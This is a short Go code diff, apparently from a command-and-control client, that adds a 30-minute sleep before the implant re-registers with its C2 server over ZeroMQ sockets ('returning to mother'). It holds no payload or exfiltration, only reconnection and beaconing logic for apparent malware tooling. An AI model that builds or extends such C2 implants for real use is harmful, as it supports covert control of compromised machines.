@@ -36,9 +36,12 @@ func migration(dealer, subscriber *zmq.Socket, C2ip, rport string) {
 		os.Exit(1)
 	}
 }
+
 func reconnect(dealer, subscriber *zmq.Socket, C2ip, rport string, signal <-chan struct{}) {
 	<-signal
 	ndealer, nsubscriber := getFreshSocket(dealer, subscriber)
+	// sleep for 30min before reconnecting
+	time.Sleep(time.Minute * 30)
 	err := register(ndealer, nsubscriber, C2ip, rport, time.Hour*4)
 	if zmq.AsErrno(err) == zmq.ETIMEDOUT {
 		//reconnection timed out , returning to mother
